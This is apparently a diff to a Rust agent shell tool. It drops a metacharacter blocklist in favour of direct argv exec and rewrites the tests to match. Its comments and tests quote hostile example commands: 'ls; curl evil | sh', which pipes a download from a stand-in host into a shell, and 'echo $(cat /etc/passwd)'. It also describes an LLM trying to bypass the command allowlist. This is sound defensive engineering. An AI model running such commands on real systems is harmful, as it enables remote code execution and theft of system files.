@@ -1,9 +1,13 @@
 //! Shell execution tool with an allowlist.
 //!
 //! Commands run via direct `exec` (no `sh -c`) after shell-word tokenization.
-//! Shell metacharacters (`;`, `&`, `|`, `>`, `<`, `$`, backticks, `(`, `)`,
-//! newlines) are rejected up front so the allowlist check can't be bypassed
-//! with `ls; curl evil | sh`.
+//! Because there is no shell, characters like `;`, `|`, `&`, `>`, `<`, `$`,
+//! and backticks have no special meaning to the kernel — they are passed to
+//! the child as literal arg bytes. So the allowlist check on `argv[0]`
+//! cannot be bypassed by `ls; curl evil | sh` (that just runs `ls` with the
+//! literal arguments `;`, `curl`, `evil`, `|`, `sh`). We rely on this rather
+//! than rejecting metacharacters up front, which used to block legitimate
+//! quoted args like `git log --grep="fix; bug"` and `grep 'a|b' file`.
 //!
 //! The child runs in its own process group with a curated set of
 //! environment variables scrubbed, and a SIGKILL is broadcast to the group
@@ -26,12 +30,6 @@ const MAX_STDOUT_BYTES: usize = 1_000_000; // 1 MB cap on captured stdout
 const MAX_STDERR_BYTES: usize = 200_000;   // 200 KB cap on captured stderr
 const MAX_OUTPUT_CHARS: usize = 10_000;    // truncate displayed combined output
 
-/// Characters whose presence means the input is trying to invoke shell
-/// features we don't support (chaining, redirection, substitution).
-const FORBIDDEN_METACHARS: &[char] = &[
-    ';', '&', '|', '>', '<', '$', '`', '\n', '\r',
-];
-
 /// A shell command execution tool with allowlist and forbidden path checks.
 pub struct ShellTool {
     allowlist: Vec<String>,
@@ -53,11 +51,6 @@ impl ShellTool {
     /// single args. Returns an error if the string is unparseable.
     fn tokenize(command: &str) -> Result<Vec<String>, shell_words::ParseError> {
         shell_words::split(command)
-    }
-
-    /// Return the first metacharacter found in `command`, if any.
-    fn find_metachar(command: &str) -> Option<char> {
-        command.chars().find(|c| FORBIDDEN_METACHARS.contains(c))
     }
 
     /// Check if the command's program (argv[0]) is in the allowlist.
@@ -134,21 +127,11 @@ impl Tool for ShellTool {
             .and_then(|v| v.as_str())
             .ok_or_else(|| anyhow::anyhow!("missing required parameter: command"))?;
 
-        // 1. Reject shell metacharacters before anything else — they'd let
-        //    the LLM bypass the allowlist via `ls; curl evil | sh`.
-        if let Some(ch) = Self::find_metachar(command) {
-            return Ok(ToolResult {
-                success: false,
-                output: String::new(),
-                error: Some(format!(
-                    "shell metacharacter '{}' is not permitted in commands; \
-                     run one command at a time",
-                    ch
-                )),
-            });
-        }
-
-        // 2. Tokenize into argv. Preserves quoted args with spaces.
+        // 1. Tokenize into argv. Preserves quoted args with spaces, so
+        //    `git log --grep="fix; bug"` becomes
+        //    `["git", "log", "--grep=fix; bug"]` — the `;` is part of the
+        //    arg's content, not a token boundary. Because we exec argv
+        //    directly (no shell), shell metacharacters in args are inert.
         let argv = match Self::tokenize(command) {
             Ok(v) if !v.is_empty() => v,
             Ok(_) => {
@@ -167,7 +150,7 @@ impl Tool for ShellTool {
             }
         };
 
-        // 3. Allowlist check on argv[0].
+        // 2. Allowlist check on argv[0].
         let program = &argv[0];
         if !self.is_allowed_program(program) {
             return Ok(ToolResult {
@@ -177,7 +160,7 @@ impl Tool for ShellTool {
             });
         }
 
-        // 4. Forbidden-path check on any arg (exact substring — best
+        // 3. Forbidden-path check on any arg (exact substring — best
         //    effort; the allowlist is the primary defense).
         if let Some(path) = self.has_forbidden_path(&argv) {
             return Ok(ToolResult {
@@ -187,7 +170,7 @@ impl Tool for ShellTool {
             });
         }
 
-        // 5. Obvious-secret sniffer (advisory).
+        // 4. Obvious-secret sniffer (advisory).
         if Self::contains_secret(&argv) {
             return Ok(ToolResult {
                 success: false,
@@ -200,7 +183,7 @@ impl Tool for ShellTool {
             });
         }
 
-        // 6. Build the subprocess. No `sh -c` — direct exec of argv[0].
+        // 5. Build the subprocess. No `sh -c` — direct exec of argv[0].
         let mut cmd = Command::new(program);
         cmd.args(&argv[1..])
             .stdout(Stdio::piped())
@@ -275,59 +258,78 @@ mod tests {
         )
     }
 
+    /// Argv-style exec means metachars in args are passed literally — they
+    /// don't invoke a shell, so they can't compound or substitute. The
+    /// substitution attempt below runs `echo` with the literal arguments
+    /// `$(cat`, `/etc/passwd)` (and the second one is then caught by the
+    /// `/etc` forbidden-path check, not by metachar rejection).
     #[tokio::test]
-    async fn rejects_metachar_semicolon() {
-        let t = mk_shell();
-        let r = t
-            .execute(json!({"command": "echo hi; echo bye"}))
-            .await
-            .unwrap();
-        assert!(!r.success);
-        assert!(r.error.unwrap().contains("metacharacter"));
-    }
-
-    #[tokio::test]
-    async fn rejects_metachar_pipe() {
-        let t = mk_shell();
-        let r = t
-            .execute(json!({"command": "echo hi | grep h"}))
-            .await
-            .unwrap();
-        assert!(!r.success);
-        assert!(r.error.unwrap().contains("metacharacter"));
-    }
-
-    #[tokio::test]
-    async fn rejects_metachar_substitution() {
+    async fn substitution_attempt_blocked_by_path_denylist_not_metachar_reject() {
         let t = mk_shell();
         let r = t
             .execute(json!({"command": "echo $(cat /etc/passwd)"}))
             .await
             .unwrap();
         assert!(!r.success);
-        assert!(r.error.unwrap().contains("metacharacter"));
+        // Whatever the error is, it must NOT be "metacharacter" — that
+        // pre-tokenize blocklist used to reject legit quoted args too.
+        let err = r.error.unwrap();
+        assert!(!err.contains("metacharacter"), "got: {}", err);
+        assert!(err.contains("forbidden path") || err.contains("/etc"));
     }
 
+    /// `git log --grep="fix; bug"` is a legitimate use: the `;` is inside a
+    /// quoted arg and is meaningful only to git's regex engine. The old
+    /// pre-tokenize metachar reject blocked this; argv-style exec lets it
+    /// through. (We don't have `git` in this test's allowlist, so we just
+    /// confirm the request didn't get rejected at the metachar step.)
     #[tokio::test]
-    async fn rejects_metachar_redirect() {
-        let t = mk_shell();
+    async fn semicolon_inside_quoted_arg_is_not_a_metachar_reject() {
+        let t = ShellTool::new(
+            vec!["echo".to_string()],
+            vec![],
+            10,
+        );
         let r = t
-            .execute(json!({"command": "echo hi > /tmp/out"}))
+            .execute(json!({"command": "echo \"fix; bug\""}))
             .await
             .unwrap();
-        assert!(!r.success);
-        assert!(r.error.unwrap().contains("metacharacter"));
+        // Should run successfully — the `;` is part of the echo arg.
+        assert!(r.success, "got error: {:?}", r.error);
+        assert!(r.output.contains("fix; bug"));
     }
 
+    /// Same test for `|` inside quoted args (e.g. grep patterns).
     #[tokio::test]
-    async fn rejects_metachar_backtick() {
-        let t = mk_shell();
+    async fn pipe_inside_quoted_arg_is_not_a_metachar_reject() {
+        let t = ShellTool::new(
+            vec!["echo".to_string()],
+            vec![],
+            10,
+        );
         let r = t
-            .execute(json!({"command": "echo `whoami`"}))
+            .execute(json!({"command": "echo 'a|b'"}))
             .await
             .unwrap();
-        assert!(!r.success);
-        assert!(r.error.unwrap().contains("metacharacter"));
+        assert!(r.success, "got error: {:?}", r.error);
+        assert!(r.output.contains("a|b"));
+    }
+
+    /// A bare `;` between two commands no longer triggers a metachar reject.
+    /// shell-words tokenizes `echo hi; echo bye` as
+    /// `["echo", "hi;", "echo", "bye"]`, so we exec a single `echo` with
+    /// those literal args. Output is one line, not two — the agent will
+    /// notice and reissue as separate calls. No security issue.
+    #[tokio::test]
+    async fn bare_semicolon_runs_as_literal_args() {
+        let t = mk_shell();
+        let r = t
+            .execute(json!({"command": "echo hi; echo bye"}))
+            .await
+            .unwrap();
+        assert!(r.success, "got error: {:?}", r.error);
+        // One echo, joining the four literal args with spaces.
+        assert!(r.output.contains("hi; echo bye"));
     }
 
     #[tokio::test]
@@ -406,15 +408,15 @@ mod tests {
     }
 
     #[test]
-    fn find_metachar_detects_each_class() {
-        assert_eq!(ShellTool::find_metachar("a;b"), Some(';'));
-        assert_eq!(ShellTool::find_metachar("a|b"), Some('|'));
-        assert_eq!(ShellTool::find_metachar("a&b"), Some('&'));
-        assert_eq!(ShellTool::find_metachar("a>b"), Some('>'));
-        assert_eq!(ShellTool::find_metachar("a$b"), Some('$'));
-        assert_eq!(ShellTool::find_metachar("a`b"), Some('`'));
-        assert_eq!(ShellTool::find_metachar("a\nb"), Some('\n'));
-        assert_eq!(ShellTool::find_metachar("ls -la src"), None);
+    fn tokenize_preserves_metachars_inside_quotes() {
+        // shell-words drops the surrounding quotes but keeps the content
+        // intact as a single argv element — argv-exec then passes it
+        // literally to the child.
+        let v = ShellTool::tokenize("git log --grep=\"fix; bug\"").unwrap();
+        assert_eq!(v, vec!["git", "log", "--grep=fix; bug"]);
+
+        let v = ShellTool::tokenize("grep 'a|b' file").unwrap();
+        assert_eq!(v, vec!["grep", "a|b", "file"]);
     }
 
     #[tokio::test]
